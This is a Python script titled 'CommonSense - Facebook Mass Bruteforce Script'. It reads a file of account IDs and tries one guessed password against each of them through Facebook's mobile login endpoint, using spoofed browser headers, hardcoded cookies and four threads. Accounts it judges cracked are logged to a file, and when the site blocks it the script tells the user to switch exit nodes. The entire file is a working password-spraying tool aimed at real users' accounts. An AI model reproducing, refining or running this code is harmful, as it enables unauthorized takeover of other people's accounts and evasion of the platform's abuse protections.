from urllib import request, parse
import requests
import sys
import time
from math import floor
import threading
from bs4 import BeautifulSoup


class ColorPrint:

    @staticmethod
    def print_fail(message, end='\n'):
        sys.stderr.write('\x1b[1;31m' + message.strip() + '\x1b[0m' + end)

    @staticmethod
    def print_pass(message, end='\n'):
        sys.stdout.write('\x1b[1;32m' + message.strip() + '\x1b[0m' + end)

    @staticmethod
    def print_warn(message, end='\n'):
        sys.stderr.write('\x1b[1;33m' + message.strip() + '\x1b[0m' + end)

    @staticmethod
    def print_info(message, end='\n'):
        sys.stdout.write('\x1b[1;34m' + message.strip() + '\x1b[0m' + end)

    @staticmethod
    def print_bold(message, end='\n'):
        sys.stdout.write('\x1b[1;37m' + message.strip() + '\x1b[0m' + end)


class attackProperties:
    def __init__(self, accounts, password):
        self.accounts = accounts
        self.password = password
        self.failed = []
        self.success = []
        self.totalAttempts = len(accounts)
        self.passedAttempts = 0
        self.timestamp = time.time()
        self.elapsedReq = ""


class prepare_attack():
    def __init__(self, attackProperties):
        self.propertiesObject = attackProperties
        self.accounts = attackProperties.accounts
        self.password = attackProperties.password
        self.headers = {
            "Host": "mbasic.facebook.com",
            "User-Agent": "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.23 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3",
            "Referer": "https://mbasic.facebook.com/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fedit-user%2F&_rdr",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "fr=1OOa97GZErNsHvmiy.AWXBDeuIXqqzmDaQPG_Ffu2Pfpw.Bd_iEx.1I.ABA.0.0.Bd_7wT.AWXVhKu9; sb=MSH-XeA_Z3dTpebJAELZGntI; wd=1536x750; datr=MSH-Xdbz1SJFNFmbIxc8mbys; dpr=1.25; locale=en_US"

        }
        self.url = "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fedit-user%2F&lwv=100"
        # self.url = "https://gs.statcounter.com/detect"

    def init(self, chunk):
        chunkSize = round(self.propertiesObject.totalAttempts / 4)
        if chunk == 1:
            start = self.accounts[0]
            st = 0
            nd = chunkSize
            end = self.accounts[chunkSize]
        elif chunk == 2:
            start = self.accounts[chunkSize]
            st = chunkSize
            nd = chunkSize * 2
            end = self.accounts[chunkSize * 2]
        elif chunk == 3:
            start = self.accounts[chunkSize * 2]
            st = chunkSize * 2
            nd = chunkSize * 3
            end = self.accounts[chunkSize * 3]
        elif chunk == 4:
            start = self.accounts[chunkSize * 3]
            st = chunkSize * 3
            nd = chunkSize * 4
            end = self.accounts[chunkSize * 4 - 1]
        for id in self.accounts[st:nd]:
            self.login(id, self.password)
            try:
                percent = floor((self.propertiesObject.passedAttempts * 100) / self.propertiesObject.totalAttempts)
            except ZeroDivisionError:
                percent = 0
            remaining = self.propertiesObject.totalAttempts - self.propertiesObject.passedAttempts
            elapsed = str(self.propertiesObject.elapsedReq)
            print('{0}\r' + format(str(percent) + "% "), end='')
            print("| Attempts: " + str(self.propertiesObject.passedAttempts), end='')
            print("| Remaining: " + str(remaining), end='')
            print("| Current: ", str(id), end='')
            print("| \x1b[1;31mFailed: " + str(len(self.propertiesObject.failed)) + "\x1b[0m", end='')
            print("| \x1b[1;32mSuccess: " + str(len(self.propertiesObject.success)) + "\x1b[0m", end='')
            print("| \x1b[1;37mLast Request time: |", str(elapsed) + "\x1b[0m", end='')

        print("\nThread " + str(chunk) + "'s Work finished")

    def store_results(self, success_list):
        f = open("CS_log.txt", 'a')
        f.write("\n" + str(success_list[0]) + ":" + success_list[1])
        f.close()

    def login(self, id, password):
        data = (
                    "lsd=AVoCc5Qx&jazoest=2682&m_ts=1577108075&li=a8IAXkMGk51FeTYD3v9xbDDB&try_number=0&unrecognized_tries=0&email=" + str(
                id) + "&pass=" + password + "&login=Se+connecter").encode('utf-8')

        # data = parse.urlencode(self.headers).encode()
        req = request.Request(self.url, data, self.headers)  # self.headers To simulate a user-agent (beware of block)
        try:
            resp = request.urlopen(req)
            soup = BeautifulSoup(resp.read().decode('utf-8'), 'html.parser')
            title = soup.title.string
        except:
            print("\nA thread is facing a problem, trying to resume...")
            resp = request.urlopen(req)
            soup = BeautifulSoup(resp.read().decode('utf-8'), 'html.parser')
            title = soup.title.string
            self.login(id, password)
        # treat the resp (response)
        if "Log Into Facebook" == title:
            self.propertiesObject.passedAttempts += 1
            self.propertiesObject.success.append([id, password])
            self.store_results([id, password])
        if "You Can't Use This Feature Right Now" in title:
            input('\nOOPS, facebook limited the shit out of you, change exit node Then press ENTER four times (4thr)')
            self.login(id, password)
        if "Log into Facebook | Facebook" in title:
            print("\nfail..")
        else:
            self.propertiesObject.passedAttempts += 1
            self.propertiesObject.failed.append([id, password])

        self.propertiesObject.elapsedReq = time.time() - self.propertiesObject.timestamp
        self.propertiesObject.timestamp = time.time()


info = ColorPrint()


def printHeader():
    print("============================================================")
    print("==:    CommonSense - Facebook Mass Bruteforce Script     :==")
    print("============================================================")

    info.print_bold("Put account ID's list filename :=> ", end='')
    filename = input()
    info.print_bold("Guess a password:=> ", end='')
    fpass = input()
    time.sleep(1.2)
    info.print_pass("! Beginning the brute operation ...")
    return {"fname": filename, "p": fpass}


# Printing the display:
props = printHeader()
f = open(props["fname"], "r")
acc = f.read()
f.close()
accounts = acc.split("\n")
info.print_info("You have entered " + str(len(accounts)) + " guessing posibilities with the password: ", end='')
info.print_warn(props['p'])
properties = attackProperties(accounts, props["p"])
# properties2 = attackProperties([11, 21], "azerty123")

Attack = prepare_attack(properties)
# Attack2 = prepare_attack(properties2)

th1 = threading.Thread(target=Attack.init, args=(1,))
th2 = threading.Thread(target=Attack.init, args=(2,))
th3 = threading.Thread(target=Attack.init, args=(3,))
th4 = threading.Thread(target=Attack.init, args=(4,))
th1.start()
th2.start()
th3.start()
th4.start()
th1.join()
th2.join()
th3.join()
th4.join()

# Attack.init()
# Attack2.login()
